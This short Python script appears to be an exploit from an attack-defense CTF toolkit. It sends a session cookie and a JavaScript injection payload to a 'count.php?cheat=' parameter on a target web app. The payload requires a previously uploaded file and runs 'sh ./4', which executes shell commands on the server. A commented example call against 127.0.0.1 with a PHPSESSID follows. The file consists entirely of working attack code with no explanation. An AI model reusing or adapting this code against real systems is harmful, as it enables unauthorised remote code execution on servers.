#!/usr/bin/env python


from http import http
from config import *
from function  import *
from urllib import quote


def js_exe(target,filename,cookie):
    header = {"Cookie":cookie}
    res = "error"
    data = "require('./" + filename + "').a('sh ./4');1"
    try:
	res = http("get",target,target_port,"/ez_web/admin/count.php?cheat=" + quote(data),"",header)
    except Exception,e:
	dump_error(target,e,"js_exe.py js_exe")
	return False
    return res

#js_exe("127.0.0.1","2","PHPSESSID=5hurakabmkompu4ks1a1g6ab75")

